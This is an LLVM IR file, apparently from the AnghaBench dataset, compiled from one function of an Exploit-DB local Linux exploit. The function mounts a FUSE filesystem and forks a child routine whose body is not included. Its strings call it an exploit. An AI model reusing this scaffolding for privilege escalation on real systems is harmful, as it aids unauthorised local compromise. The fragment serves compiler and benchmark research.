; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_34923.c_fuse_main_suid.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_34923.c_fuse_main_suid.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.fuse_operations = type { i32 }
%struct.fuse = type { i32 }

@.str = private unnamed_addr constant [31 x i8] c"Usage: fuse_suid <mountpoint>\0A\00", align 1
@EINVAL = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c"fuse_suid\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-f\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"--\00", align 1
@.str.4 = private unnamed_addr constant [45 x i8] c"FUSE initialized.  Time to have some fun...\0A\00", align 1
@.str.5 = private unnamed_addr constant [61 x i8] c"Warning: this exploit hangs on exit.  Hit Ctrl-C when done.\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i32, i8**, %struct.fuse_operations*, i8*)* @fuse_main_suid to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @fuse_main_suid(i32 %0, i8** %1, %struct.fuse_operations* %2, i8* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8**, align 8
  %8 = alloca %struct.fuse_operations*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca %struct.fuse*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [5 x i8*], align 16
  store i32 %0, i32* %6, align 4
  store i8** %1, i8*** %7, align 8
  store %struct.fuse_operations* %2, %struct.fuse_operations** %8, align 8
  store i8* %3, i8** %9, align 8
  %15 = load i32, i32* %6, align 4
  %16 = icmp ne i32 %15, 2
  br i1 %16, label %17, label %21

17:                                               ; preds = %4
  %18 = call i32 @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str, i64 0, i64 0))
  %19 = load i32, i32* @EINVAL, align 4
  %20 = sub nsw i32 0, %19
  store i32 %20, i32* %5, align 4
  br label %63

21:                                               ; preds = %4
  %22 = getelementptr inbounds [5 x i8*], [5 x i8*]* %14, i64 0, i64 0
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i8** %22, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8** %23, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8** %24, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8**, i8*** %7, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  store i8* %28, i8** %25, align 8
  %29 = getelementptr inbounds i8*, i8** %25, i64 1
  store i8* null, i8** %29, align 8
  %30 = getelementptr inbounds [5 x i8*], [5 x i8*]* %14, i64 0, i64 0
  %31 = load %struct.fuse_operations*, %struct.fuse_operations** %8, align 8
  %32 = load i8*, i8** %9, align 8
  %33 = call %struct.fuse* @fuse_setup(i32 4, i8** %30, %struct.fuse_operations* %31, i32 4, i8** %11, i32* %12, i8* %32)
  store %struct.fuse* %33, %struct.fuse** %10, align 8
  %34 = load %struct.fuse*, %struct.fuse** %10, align 8
  %35 = icmp eq %struct.fuse* %34, null
  br i1 %35, label %36, label %37

36:                                               ; preds = %21
  store i32 1, i32* %5, align 4
  br label %63

37:                                               ; preds = %21
  %38 = call i32 @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.4, i64 0, i64 0))
  %39 = call i32 @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.5, i64 0, i64 0))
  %40 = call i64 (...) @fork()
  %41 = icmp eq i64 %40, 0
  br i1 %41, label %42, label %46

42:                                               ; preds = %37
  %43 = load i8*, i8** %11, align 8
  %44 = call i32 @child1(i8* %43)
  %45 = call i32 @_exit(i32 %44) #3
  unreachable

46:                                               ; preds = %37
  %47 = load i32, i32* %12, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %52

49:                                               ; preds = %46
  %50 = load %struct.fuse*, %struct.fuse** %10, align 8
  %51 = call i32 @fuse_loop_mt(%struct.fuse* %50)
  store i32 %51, i32* %13, align 4
  br label %55

52:                                               ; preds = %46
  %53 = load %struct.fuse*, %struct.fuse** %10, align 8
  %54 = call i32 @fuse_loop(%struct.fuse* %53)
  store i32 %54, i32* %13, align 4
  br label %55

55:                                               ; preds = %52, %49
  %56 = load %struct.fuse*, %struct.fuse** %10, align 8
  %57 = load i8*, i8** %11, align 8
  %58 = call i32 @fuse_teardown(%struct.fuse* %56, i8* %57)
  %59 = load i32, i32* %13, align 4
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

61:                                               ; preds = %55
  store i32 1, i32* %5, align 4
  br label %63

62:                                               ; preds = %55
  store i32 0, i32* %5, align 4
  br label %63

63:                                               ; preds = %62, %61, %36, %17
  %64 = load i32, i32* %5, align 4
  ret i32 %64
}

declare dso_local i32 @printf(i8*) #1

declare dso_local %struct.fuse* @fuse_setup(i32, i8**, %struct.fuse_operations*, i32, i8**, i32*, i8*) #1

declare dso_local i64 @fork(...) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

declare dso_local i32 @child1(i8*) #1

declare dso_local i32 @fuse_loop_mt(%struct.fuse*) #1

declare dso_local i32 @fuse_loop(%struct.fuse*) #1

declare dso_local i32 @fuse_teardown(%struct.fuse*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
